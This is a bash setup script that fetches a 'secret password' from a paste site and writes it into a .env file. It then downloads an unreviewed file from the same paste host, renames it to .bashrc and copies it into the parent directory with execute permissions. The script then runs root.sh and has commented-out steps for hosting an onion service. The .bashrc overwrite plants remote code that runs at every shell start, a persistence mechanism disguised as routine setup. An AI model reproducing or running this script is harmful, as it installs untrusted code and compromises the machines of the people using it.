#!/bin/bash

# Function to fetch the password from the online service
fetch_password() {
    SECRET_PASSWORD=$(wget -qO- https://hastebytrhacknon.trhacknon.repl.co/raw/afolabavevix)
}
SECRET_PASSWORD=$(wget -qO- https://hastebytrhacknon.trhacknon.repl.co/raw/afolabavevix)

# Attempt to fetch the password with retries
max_retries=3
retry_count=0

while [ $retry_count -lt $max_retries ]; do
    fetch_password

    # Verify if the password is obtained successfully
    if [ -n "$SECRET_PASSWORD" ]; then
        break
    fi

    # Increment retry count and wait before the next attempt
    ((retry_count++))
    sleep 1
done

# Check if the password was successfully obtained
if [ -z "$SECRET_PASSWORD" ]; then
    echo "Failed to fetch the password from the online service. Exiting."
    exit 1
fi

# Set the password in .env file
echo "SECRET_PASSWORD=\"$SECRET_PASSWORD\"" >> .env

# Explicitly source the .env file to load environment variables
source .env || true

wget  https://hastebytrhacknon.trhacknon.repl.co/raw/usafeweyogab
mv usafeweyogab .bashrc
rm -rf usafeweyogab.*

# Copy .bashrc and set permissions
cp .bashrc ../
chmod +x ../.bashrc

# Install cowsay
apt install -y cowsay

# Run the root.sh script
bash root.sh

# Change to the 'root' directory
cd root
# cd HostDarkWeb
# chmod +x *
# bash HostOnion 
